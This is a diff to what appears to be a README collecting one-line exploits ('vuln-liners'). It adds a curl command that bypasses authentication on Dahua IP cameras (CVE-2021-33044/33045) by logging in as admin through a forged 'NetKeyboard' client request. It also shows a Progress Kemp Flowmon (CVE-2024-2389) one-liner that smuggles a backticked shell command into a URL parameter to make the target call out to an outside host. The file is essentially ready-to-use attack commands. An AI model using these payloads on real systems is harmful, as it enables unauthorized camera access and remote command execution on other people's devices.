@@ -1,6 +1,9 @@
 # vuln-liners
 One line vulnerabilities
 
+## CVE-2021-33044, CVE-2021-33045 (Dahua IP Camera Authentication Bypass):
+`curl -Liksv http://<IP>/RPC2_Login --header "Host: <IP>:<PORT>" --header "User-Agent: Mozilla/5.0 (SS; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" --header "Accept: application/json, text/javascript, */*; q=0.01" --header "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --header "Origin: http://<IP>/" --header "Referer: http://<IP>/" --header "X-Requested-With: XMLHttpRequest" --header "Accept-Encoding: gzip" -d "{"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}"`
+
 ## CVE-2024-2389 (Progress Kemp Flowmon):
 `curl -kv 'https://192.168.56.12/service.pdfs/confluence?lang=en&file=`curl+IP+PORT`'`
 
